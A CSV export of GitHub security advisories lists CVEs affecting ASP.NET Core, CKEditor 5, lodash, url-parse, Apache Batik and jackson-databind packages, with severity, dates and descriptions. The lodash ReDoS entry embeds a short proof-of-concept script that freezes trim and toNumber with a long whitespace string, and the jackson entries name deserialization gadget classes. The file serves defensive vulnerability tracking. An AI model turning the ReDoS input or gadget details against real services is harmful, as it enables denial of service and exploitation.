2071,13583,Microsoft.AspNetCore.Mvc.DataAnnotations,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2072,14457,Microsoft.AspNetCore.Mvc.Cors,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2073,13601,Microsoft.AspNetCore.Mvc.ApiExplorer,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2074,13092,Microsoft.AspNetCore.Mvc.Abstractions,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2075,13534,System.Net.WebSockets.Client,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2076,13095,System.Net.Security,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2077,13507,System.Net.Http.WinHttpHandler,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2078,13209,System.Text.Encodings.Web,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2079,12860,System.Net.Http,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2080,12903,Microsoft.AspNetCore.Mvc.Core,GHSA-qhqf-ghgh-x2m4,CVE-2017-0249,https://github.com/advisories/GHSA-qhqf-ghgh-x2m4,high,2018-10-16 19:57:38 UTC,High severity vulnerability that affects Microsoft.AspNetCore.Mvc,See https://nvd.nist.gov/vuln/detail/CVE-2017-0249 & https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0249,nuget
2081,15483,Microsoft.AspNetCore.Mvc.WebApiCompatShim,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2082,13017,Microsoft.AspNetCore.Mvc.ViewFeatures,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2083,13281,Microsoft.AspNetCore.Mvc.TagHelpers,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2084,13192,Microsoft.AspNetCore.Mvc.Razor,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2085,14354,Microsoft.AspNetCore.Mvc.Localization,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2086,13991,Microsoft.AspNetCore.Mvc.Formatters.Xml,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2087,13221,Microsoft.AspNetCore.Mvc.Formatters.Json,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2088,13583,Microsoft.AspNetCore.Mvc.DataAnnotations,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2089,14457,Microsoft.AspNetCore.Mvc.Cors,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2090,13601,Microsoft.AspNetCore.Mvc.ApiExplorer,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2091,13092,Microsoft.AspNetCore.Mvc.Abstractions,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2092,13534,System.Net.WebSockets.Client,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2093,13095,System.Net.Security,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2094,13209,System.Text.Encodings.Web,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2095,12860,System.Net.Http,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2096,12903,Microsoft.AspNetCore.Mvc.Core,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
2097,15483,Microsoft.AspNetCore.Mvc.WebApiCompatShim,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2098,13017,Microsoft.AspNetCore.Mvc.ViewFeatures,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2099,13281,Microsoft.AspNetCore.Mvc.TagHelpers,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2100,13192,Microsoft.AspNetCore.Mvc.Razor,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2101,14354,Microsoft.AspNetCore.Mvc.Localization,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2102,13991,Microsoft.AspNetCore.Mvc.Formatters.Xml,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2103,13221,Microsoft.AspNetCore.Mvc.Formatters.Json,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2104,13583,Microsoft.AspNetCore.Mvc.DataAnnotations,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2105,14457,Microsoft.AspNetCore.Mvc.Cors,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2106,13601,Microsoft.AspNetCore.Mvc.ApiExplorer,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2107,13092,Microsoft.AspNetCore.Mvc.Abstractions,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2108,13534,System.Net.WebSockets.Client,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2109,13095,System.Net.Security,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2110,13507,System.Net.Http.WinHttpHandler,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2111,13209,System.Text.Encodings.Web,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2112,12860,System.Net.Http,GHSA-ch6p-4jcm-h8vh,CVE-2017-0248,https://github.com/advisories/GHSA-ch6p-4jcm-h8vh,moderate,2018-10-16 19:58:52 UTC,Moderate severity vulnerability that affects Microsoft.AspNetCore.Mvc and Microsoft.AspNetCore.Mvc.Core,"Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7 allow an attacker to bypass Enhanced Security Usage taggings when they present a certificate that is invalid for a specific use, aka "".NET Security Feature Bypass Vulnerability.""",nuget
2113,18540,is-my-json-valid,GHSA-4hpf-3wq7-5rpr,CVE-2018-1107,https://github.com/advisories/GHSA-4hpf-3wq7-5rpr,moderate,2022-01-06 20:44:07 UTC,Regular expression deinal of service (ReDoS) in is-my-json-valid,It was discovered that the is-my-json-valid JavaScript library used an inefficient regular expression to validate JSON fields defined to have email format. A specially crafted JSON file could cause it to consume an excessive amount of CPU time when validated.,npm
2114,18518,@ckeditor/ckeditor5-paste-from-office,GHSA-3rh3-wfr4-76mj,CVE-2021-21391,https://github.com/advisories/GHSA-3rh3-wfr4-76mj,moderate,2021-04-06 17:28:41 UTC,Regular expression Denial of Service in multiple packages,"
### Impact
A regular expression denial of service (ReDoS) vulnerability has been discovered in multiple CKEditor 5 packages. The vulnerability allowed to abuse particular regular expressions, which could cause a significant performance drop resulting in a browser tab freeze. It affects all users using the CKEditor 5 packages listed above at version <= 26.0.0.

### Patches
The problem has been recognized and patched. The fix will be available in version 27.0.0.

### For more information
Email us at security@cksource.com if you have any questions or comments about this advisory.

### Acknowledgements
The CKEditor 5 team would like to thank Yeting Li for recognizing and reporting these vulnerabilities.",npm
2115,18463,@ckeditor/ckeditor5-media-embed,GHSA-3rh3-wfr4-76mj,CVE-2021-21391,https://github.com/advisories/GHSA-3rh3-wfr4-76mj,moderate,2021-04-06 17:28:41 UTC,Regular expression Denial of Service in multiple packages,"
### Impact
A regular expression denial of service (ReDoS) vulnerability has been discovered in multiple CKEditor 5 packages. The vulnerability allowed to abuse particular regular expressions, which could cause a significant performance drop resulting in a browser tab freeze. It affects all users using the CKEditor 5 packages listed above at version <= 26.0.0.

### Patches
The problem has been recognized and patched. The fix will be available in version 27.0.0.

### For more information
Email us at security@cksource.com if you have any questions or comments about this advisory.

### Acknowledgements
The CKEditor 5 team would like to thank Yeting Li for recognizing and reporting these vulnerabilities.",npm
2116,17932,@ckeditor/ckeditor5-list,GHSA-3rh3-wfr4-76mj,CVE-2021-21391,https://github.com/advisories/GHSA-3rh3-wfr4-76mj,moderate,2021-04-06 17:28:41 UTC,Regular expression Denial of Service in multiple packages,"
### Impact
A regular expression denial of service (ReDoS) vulnerability has been discovered in multiple CKEditor 5 packages. The vulnerability allowed to abuse particular regular expressions, which could cause a significant performance drop resulting in a browser tab freeze. It affects all users using the CKEditor 5 packages listed above at version <= 26.0.0.

### Patches
The problem has been recognized and patched. The fix will be available in version 27.0.0.

### For more information
Email us at security@cksource.com if you have any questions or comments about this advisory.

### Acknowledgements
The CKEditor 5 team would like to thank Yeting Li for recognizing and reporting these vulnerabilities.",npm
2117,37435,org.apache.xmlgraphics:batik-xml,GHSA-2h63-qp69-fwvw,CVE-2020-11987,https://github.com/advisories/GHSA-2h63-qp69-fwvw,high,2022-01-06 20:35:54 UTC,Server-side request forgery (SSRF) in Apache Batik,"Apache Batik 1.13 is vulnerable to server-side request forgery, caused by improper input validation by the NodePickerPanel. By using a specially-crafted argument, an attacker could exploit this vulnerability to cause the underlying server to make arbitrary GET requests.",maven
2118,35433,org.apache.xmlgraphics:batik-util,GHSA-2h63-qp69-fwvw,CVE-2020-11987,https://github.com/advisories/GHSA-2h63-qp69-fwvw,high,2022-01-06 20:35:54 UTC,Server-side request forgery (SSRF) in Apache Batik,"Apache Batik 1.13 is vulnerable to server-side request forgery, caused by improper input validation by the NodePickerPanel. By using a specially-crafted argument, an attacker could exploit this vulnerability to cause the underlying server to make arbitrary GET requests.",maven
2119,16942,url-parse,GHSA-46c4-8wrp-j99v,CVE-2020-8124,https://github.com/advisories/GHSA-46c4-8wrp-j99v,moderate,2022-01-06 20:30:34 UTC,Improper Validation and Sanitization in url-parse,Insufficient validation and sanitization of user input exists in url-parse npm package version 1.4.4 and earlier may allow attacker to bypass security checks.,npm
2120,18808,lodash,GHSA-29mw-wpgm-hmr9,CVE-2020-28500,https://github.com/advisories/GHSA-29mw-wpgm-hmr9,moderate,2022-01-06 20:30:46 UTC,Regular Expression Denial of Service (ReDoS) in lodash,"All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions. Steps to reproduce (provided by reporter Liyuan Chen): var lo = require('lodash'); function build_blank (n) { var ret = ""1"" for (var i = 0; i < n; i++) { ret += "" "" } return ret + ""1""; } var s = build_blank(50000) var time0 = Date.now(); lo.trim(s) var time_cost0 = Date.now() - time0; console.log(""time_cost0: "" + time_cost0) var time1 = Date.now(); lo.toNumber(s) var time_cost1 = Date.now() - time1; console.log(""time_cost1: "" + time_cost1) var time2 = Date.now(); lo.trimEnd(s) var time_cost2 = Date.now() - time2; console.log(""time_cost2: "" + time_cost2)",npm
2121,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-qjw2-hr98-qgfh,CVE-2020-24750,https://github.com/advisories/GHSA-qjw2-hr98-qgfh,high,2021-12-09 19:15:36 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.6.7.5 and from 2.7.x before 2.9.10.6 mishandles the interaction between serialization gadgets and typing, related to com.pastdev.httpcomponents.configuration.JndiConfiguration.",maven
2122,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-89qr-369f-5m5x,CVE-2020-36182,https://github.com/advisories/GHSA-89qr-369f-5m5x,high,2021-12-09 19:15:46 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS.",maven
2123,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-9gph-22xh-8x98,CVE-2020-36179,https://github.com/advisories/GHSA-9gph-22xh-8x98,high,2021-12-09 19:15:54 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS.",maven
2124,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-8w26-6f25-cm9x,CVE-2020-36185,https://github.com/advisories/GHSA-8w26-6f25-cm9x,high,2021-12-09 19:16:02 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource.",maven
2125,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-cvm9-fjm9-3572,CVE-2020-36181,https://github.com/advisories/GHSA-cvm9-fjm9-3572,high,2021-12-09 19:16:10 UTC,Unsafe Deserialization in jackson-databind,"FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS.",maven
